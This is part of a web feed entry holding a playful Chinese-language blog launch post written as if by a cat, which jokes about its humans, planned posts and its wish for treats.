<p>(ฅ´ω`ฅ)各位两脚兽大大请注意——您正在收看的是喵星驻地球办事处开张庆典喵！本喵揣着粉爪爪在键盘上滚出这篇博客时，尾巴尖都在紧张得打蝴蝶结呢~（突然被数据线绊倒）喵嗷！这、这是人类对主子的下马威吗？！</p>
<p>（优雅舔爪）其实开博客是因为...因为罐头塔突然倒塌的启示喵！当第33个罐头咕噜噜滚进沙发底时，本喵突然尾巴通电：要是把每天在窗台偷听两脚兽聊天的八卦写成《人类观察日记》，说不定能换来更多小鱼干呢喵~（突然警觉）才、才不是想吃三文鱼味冻干才营业的！绝对没有疯狂暗示哦！</p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <div class="paragraph">
<div class="paragraph">
<p>(ฅ´ω`ฅ)各位两脚兽大大请注意——您正在收看的是喵星驻地球办事处开张庆典喵！本喵揣着粉爪爪在键盘上滚出这篇博客时，尾巴尖都在紧张得打蝴蝶结呢~（突然被数据线绊倒）喵嗷！这、这是人类对主子的下马威吗？！</p>
<p>（优雅舔爪）其实开博客是因为...因为罐头塔突然倒塌的启示喵！当第33个罐头咕噜噜滚进沙发底时，本喵突然尾巴通电：要是把每天在窗台偷听两脚兽聊天的八卦写成《人类观察日记》，说不定能换来更多小鱼干呢喵~（突然警觉）才、才不是想吃三文鱼味冻干才营业的！绝对没有疯狂暗示哦！</p>

<p>未来的更新可能会是这种喵喵画风：<br>✨周二：《震惊！铲屎官竟用会发光的板砖施展魔法！》（对着电脑工作的实录）<br>✨周四：《如何用尾巴测量床铺舒适度的专业指南》<br>✨周末特辑：《午夜跑酷时踹翻十个瓶子的美学研究》（附带花瓶选购避雷攻略）</p>
<p>( ´•̥×•̥` )要是本喵被毛线球绑架忘记更新...人、人家才没有偷偷安装补救程序喵！只是碰巧让扫地机器人定时发送《被自动喂食器囚禁的喵生回忆录》而已啦~（心虚甩尾巴）</p>
<p>这里以后就是本喵的云爬架啦~会分享被梳毛时的呼噜声分贝记录、阳光斑点追踪报告，还有重大研究成果《为什么人类总对会动的红点点疯狂射击？》（激光笔使用守则）欢迎投喂点赞代替罐罐，要是能用彩虹屁把本喵夸得炸毛...咳，本喵就勉为其难表演踩奶键盘绝活喵！</p>
<p>（突然亮出飞机耳）最后警告！本博客没有猫薄荷，只有打翻的猫草盆栽；没有优雅舔毛教程，只有被卡在纸箱里的蠢萌实录~现在逃跑已经晚啦！（肉垫拍下发布键）咕噜咕噜~快来告诉本喵，你们想先看哪篇研究呀喵？在线等罐头...啊不，等回复哦~</p>
<p>（悄悄露出粉色肉垫）P.S.那个...牛肉味冻干和鸡肉味冻干到底哪个配博客更香喵？（疯狂暗示.gif）</p>
</div>
</div>
            ]]>
        </content>
    </entry>
</feed>
